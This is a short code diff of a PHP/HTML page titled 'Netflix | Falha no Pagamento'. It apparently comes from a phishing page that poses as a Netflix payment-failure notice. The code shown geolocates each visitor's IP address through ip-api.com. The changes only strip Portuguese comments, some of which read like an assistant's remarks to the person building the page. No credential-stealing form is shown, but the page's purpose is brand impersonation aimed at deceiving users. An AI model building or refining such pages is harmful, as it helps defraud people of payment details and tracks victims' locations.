@@ -6,7 +6,7 @@
     <title>Netflix | Falha no Pagamento</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap">
     <style>
-        /* Teu CSS tá perfeito, não mexi nele */
+        
         * {
             margin: 0;
             padding: 0;
@@ -163,7 +163,7 @@
         }
 
         $encoded_ip = urlencode($ip);
-        $api_url = "http://ip-api.com/json/{$encoded_ip}"; // Trocado pra ip-api.com
+        $api_url = "http://ip-api.com/json/{$encoded_ip}"; 
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $api_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -190,7 +190,7 @@
             return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
         }
 
-        // Ajusta os campos pra combinar com teu código
+        
         return [
             'city' => $data['city'] ?? 'Cidade desconhecida',
             'region' => $data['regionName'] ?? 'Região desconhecida',
